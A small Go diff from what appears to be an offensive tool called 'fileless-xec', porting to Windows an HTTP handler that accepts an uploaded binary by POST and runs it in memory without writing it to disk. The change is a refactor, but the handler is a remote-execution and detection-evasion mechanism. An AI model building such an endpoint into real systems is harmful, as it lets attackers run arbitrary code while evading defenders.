@@ -1,9 +1,11 @@
-package server
+// +build windows
+
+package serverwindows
 
 import (
 	"bytes"
 	"fileless-xec/pkg/config"
-	"fileless-xec/pkg/exec"
+	"fileless-xec/pkg/execwindows"
 	"fmt"
 	"io"
 	"net/http"
@@ -42,7 +44,7 @@ func UploadAndExecHandler(cfg *config.Config) http.HandlerFunc {
 			http.Error(w, "GET Bad request - Only POST accepted!", 400)
 		case "POST":
 			cfg.BinaryContent = uploadFile(w, r)
-			exec.Filelessxec(cfg)
+			execwindows.Filelessxec(cfg)
 		}
 	}
 }
